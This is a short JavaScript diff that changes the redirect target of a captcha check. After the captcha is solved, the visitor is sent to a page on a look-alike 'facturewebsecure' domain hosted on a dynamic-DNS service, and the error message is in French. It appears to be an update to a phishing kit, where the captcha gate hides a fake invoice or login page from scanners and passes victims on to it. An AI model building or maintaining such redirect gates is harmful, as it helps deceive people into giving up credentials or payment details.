@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://facturewebsecure.tftpd.net/wet/wet3.html";
+        targetURL="https://facturewebsecure.tftpd.net/we/index.html";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
